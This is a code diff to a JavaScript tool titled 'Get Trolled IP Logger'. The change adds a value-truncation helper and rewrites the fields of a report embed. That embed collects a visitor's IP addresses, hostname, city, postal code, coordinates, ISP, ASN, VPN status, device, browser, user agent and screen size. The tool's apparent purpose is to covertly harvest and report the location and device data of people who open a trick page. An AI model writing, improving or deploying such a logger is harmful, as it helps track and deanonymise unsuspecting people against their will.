@@ -39,6 +39,13 @@
     return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
   }
 
+  function safeValue(val, maxLen=1024) {
+    if (val === undefined || val === null || val === '') return "N/A";
+    val = val.toString();
+    if (val.length > maxLen) return val.slice(0, maxLen - 3) + '...';
+    return val;
+  }
+
   function parseUserAgent(ua) {
     let device = "Unknown Device";
     let os = "Unknown OS";
@@ -127,7 +134,7 @@
           icon_url: "https://i.imgur.com/qZ7j0fV.png"
         },
         thumbnail: {
-          url: data.country_flag || ""
+          url: safeValue(data.country_flag, 200)
         },
         author: {
           name: "Get Trolled IP Logger",
@@ -135,36 +142,36 @@
           icon_url: "https://i.imgur.com/qZ7j0fV.png"
         },
         fields: [
-          { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
-          { name: "IPv6 Address", value: data.ipv6 ? `\`${data.ipv6}\`` : "N/A", inline: true },
-          { name: "Hostname", value: data.hostname || "N/A", inline: true },
-          { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
-          { name: "Region", value: data.region || "N/A", inline: true },
-          { name: "City", value: data.city || "N/A", inline: true },
-          { name: "Zip", value: data.postal || "N/A", inline: true },
-          { name: "Latitude", value: data.latitude || "N/A", inline: true },
-          { name: "Longitude", value: data.longitude || "N/A", inline: true },
-          { name: "ISP", value: data.isp || "N/A", inline: false },
-          { name: "Organization", value: data.org || "N/A", inline: false },
-          { name: "ASN", value: data.asn || "N/A", inline: true },
-          { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
-          { name: "Local Time", value: localTime, inline: true },
-          { name: "Currency", value: `${safeGet(data, ['currency', 'code'], 'N/A')} (${safeGet(data, ['currency', 'name'], '')})`, inline: true },
-          { name: "VPN/Proxy", value: safeGet(data, ['security', 'is_proxy'], false) ? "Yes" : "No", inline: true },
-          { name: "VPN/Hosting", value: safeGet(data, ['security', 'is_hosting'], false) ? "Yes" : "No", inline: true },
-          { name: "Mobile", value: safeGet(data, ['security', 'is_mobile'], false) ? "Yes" : "No", inline: true },
-          { name: "Bot", value: safeGet(data, ['security', 'is_bot'], false) ? "Yes" : "No", inline: true },
+          { name: "IPv4 Address", value: `\`${safeValue(data.ip)}\``, inline: true },
+          { name: "IPv6 Address", value: safeValue(data.ipv6), inline: true },
+          { name: "Hostname", value: safeValue(data.hostname), inline: true },
+          { name: "Country", value: `${safeValue(data.country)} (${safeValue(data.country_code)})`, inline: true },
+          { name: "Region", value: safeValue(data.region), inline: true },
+          { name: "City", value: safeValue(data.city), inline: true },
+          { name: "Zip", value: safeValue(data.postal), inline: true },
+          { name: "Latitude", value: safeValue(data.latitude), inline: true },
+          { name: "Longitude", value: safeValue(data.longitude), inline: true },
+          { name: "ISP", value: safeValue(data.isp), inline: false },
+          { name: "Organization", value: safeValue(data.org), inline: false },
+          { name: "ASN", value: safeValue(data.asn), inline: true },
+          { name: "Timezone", value: `${safeValue(data.timezone_gmt)} (${safeValue(data.timezone)})`, inline: true },
+          { name: "Local Time", value: safeValue(localTime), inline: true },
+          { name: "Currency", value: `${safeValue(safeGet(data, ['currency', 'code']))} (${safeValue(safeGet(data, ['currency', 'name']))})`, inline: true },
+          { name: "VPN/Proxy", value: safeValue(safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No"), inline: true },
+          { name: "VPN/Hosting", value: safeValue(safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No"), inline: true },
+          { name: "Mobile", value: safeValue(safeGet(data, ['security', 'is_mobile']) ? "Yes" : "No"), inline: true },
+          { name: "Bot", value: safeValue(safeGet(data, ['security', 'is_bot']) ? "Yes" : "No"), inline: true },
           ...(weather ? [
-            { name: "Weather", value: `${weatherDescription} - Feels like ${weather.FeelsLikeC || "N/A"}°C`, inline: true },
-            { name: "Temperature", value: `${weather.temp_C || "N/A"}°C`, inline: true },
-            { name: "Humidity", value: `${weather.humidity || "N/A"}%`, inline: true },
-            { name: "Wind Speed", value: `${weather.windspeedKmph || "N/A"} km/h`, inline: true },
+            { name: "Weather", value: `${safeValue(weatherDescription)} - Feels like ${safeValue(weather.FeelsLikeC)}°C`, inline: true },
+            { name: "Temperature", value: `${safeValue(weather.temp_C)}°C`, inline: true },
+            { name: "Humidity", value: `${safeValue(weather.humidity)}%`, inline: true },
+            { name: "Wind Speed", value: `${safeValue(weather.windspeedKmph)} km/h`, inline: true },
           ] : []),
-          { name: "Device Model", value: uaInfo.device, inline: true },
-          { name: "Operating System", value: uaInfo.os, inline: true },
-          { name: "Browser", value: uaInfo.browser, inline: true },
-          { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
-          { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)\``, inline: true },
+          { name: "Device Model", value: safeValue(uaInfo.device), inline: true },
+          { name: "Operating System", value: safeValue(uaInfo.os), inline: true },
+          { name: "Browser", value: safeValue(uaInfo.browser), inline: true },
+          { name: "User Agent", value: `\`\`\`${safeValue(navigator.userAgent, 1000)}\`\`\``, inline: false },
+          { name: "Screen Resolution", value: `\`${safeValue(window.screen.width)}×${safeValue(window.screen.height)} (${safeValue(window.devicePixelRatio)} DPR)\``, inline: true },
         ]
       };
 
